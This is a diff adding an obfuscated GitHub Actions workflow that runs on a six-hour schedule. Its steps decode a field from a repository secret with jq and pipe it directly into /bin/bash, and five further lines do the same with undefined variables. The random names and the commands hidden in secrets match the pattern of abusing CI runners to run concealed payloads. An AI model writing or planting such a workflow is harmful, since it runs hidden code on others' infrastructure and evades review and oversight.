@@ -1,0 +1,21 @@
+name: kepabushizbg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kepabushizbg
+        env:
+          efset21930: ${{ secrets.efset21930 }}
+        run: |
+          echo $efset21930 | jq -r .p72 | /bin/bash
+          echo $dq1396 | jq -r .zhw52062 | /bin/bash
+          echo $n363 | jq -r .uzd5 | /bin/bash
+          echo $gqgb063 | jq -r .zmpl757 | /bin/bash
+          echo $gdazg89 | jq -r .ak6845 | /bin/bash
+          echo $m25929 | jq -r .oe3755 | /bin/bash
+
